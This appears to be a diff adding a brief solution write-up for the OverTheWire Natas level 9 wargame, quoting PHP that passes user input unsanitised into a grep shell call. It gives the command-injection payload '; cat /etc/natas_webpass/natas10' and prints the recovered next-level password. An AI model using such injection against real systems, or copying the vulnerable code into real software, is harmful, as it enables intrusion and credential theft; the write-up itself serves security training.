@@ -1,0 +1,20 @@
+Video Solution: https://youtu.be/f3Esi58k66Q
+Task on Overthewire: http://overthewire.org/wargames/natas/
+
+http://natas9.natas.labs.overthewire.org/index-source.html
+
+<?
+$key = "";
+
+if(array_key_exists("needle", $_REQUEST)) {
+    $key = $_REQUEST["needle"];
+}
+
+if($key != "") {
+    passthru("grep -i $key dictionary.txt");
+}
+?>
+
+; cat /etc/natas_webpass/natas10
+
+nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
